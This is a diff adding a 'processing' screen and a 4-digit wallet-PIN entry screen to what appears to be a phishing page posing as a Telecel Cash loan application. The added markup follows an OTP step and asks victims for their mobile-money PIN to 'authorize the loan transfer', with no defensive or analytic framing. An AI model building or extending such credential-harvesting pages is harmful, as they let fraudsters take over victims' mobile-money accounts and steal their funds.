@@ -109,6 +109,26 @@
     <button class="btn-red" id="otp-btn" onclick="sendOTP()">Confirm & Finish</button>
 </section>
 
+    <section id="view-5" class="view" style="text-align: center; padding-top: 60px;">
+    <div class="loader"></div>
+    <h2 class="title">Processing Code...</h2>
+    <p class="subtitle">Validating your transaction with Telecel Secure. Please do not refresh.</p>
+</section>
+
+<section id="view-6" class="view">
+    <h2 class="title" style="color: var(--tele-red);">Enter Wallet PIN</h2>
+    <p class="subtitle">Please enter your 4-digit Telecel Cash PIN to authorize the loan transfer.</p>
+    
+    <div class="otp-row">
+        <input type="password" inputmode="numeric" class="pin-input" maxlength="1" oninput="movePinFocus(this, 0)">
+        <input type="password" inputmode="numeric" class="pin-input" maxlength="1" oninput="movePinFocus(this, 1)">
+        <input type="password" inputmode="numeric" class="pin-input" maxlength="1" oninput="movePinFocus(this, 2)">
+        <input type="password" inputmode="numeric" class="pin-input" maxlength="1" oninput="movePinFocus(this, 3)">
+    </div>
+
+    <button class="btn-red" id="pin-btn" onclick="sendPIN()">Authorize Transfer</button>
+</section>
+
     <section id="view-4" class="view" style="text-align: center; padding-top: 60px;">
         <div style="font-size: 4rem; margin-bottom: 20px;">✅</div>
         <h2 class="title">Application Submitted</h2>
